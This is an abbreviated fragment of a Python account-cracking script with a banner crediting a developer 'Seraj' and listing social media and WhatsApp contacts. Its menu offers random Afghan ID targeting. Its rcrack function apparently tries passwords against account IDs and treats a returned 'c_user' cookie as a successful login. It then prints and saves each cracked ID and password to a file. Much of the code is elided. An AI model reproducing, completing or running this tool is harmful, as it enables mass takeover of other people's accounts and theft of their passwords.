...
logo=("""\x1b[1;92m
   _____                   _ 
  / ___/___  _________ _  (_)
  \__ \/ _ \/ ___/ __ `/ / / 
 ___/ /  __/ /  / /_/ / / /  
/____/\___/_/   \__,_/_/ /   
                    /___/    
╔══════════════════════════════════════╗
║        WELCOME TO Seraj COMMAND  ║     
╚══════════════════════════════════════╝                                                                           
\x1b[1;92m╔══════════════════════════════════════╗
\x1b[1;92m║\033[1;92m[AK] DEVOLPER   : Seraj           ║
\x1b[1;92m║\033[1;92m[AK] FACEBOOK   : HAJI Seraj        ║
\x1b[1;92m║\033[1;92m[AK] WHATSAPP   : 93701659187         ║
\x1b[1;92m║\033[1;92m[AK] GITHUB     : AK MAFIA KING       ║
\x1b[1;92m║\033[1;92m[AK] VERTION    : 3.1                 ║
\x1b[1;92m╚══════════════════════════════════════╝ """)
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM AFG IDZ UPDATE   \x1b[1;32m1')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR.seraj-XD] '+cid+'|'+ps+'\033[0;97m')
                open('MR.HAQANI-XD.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
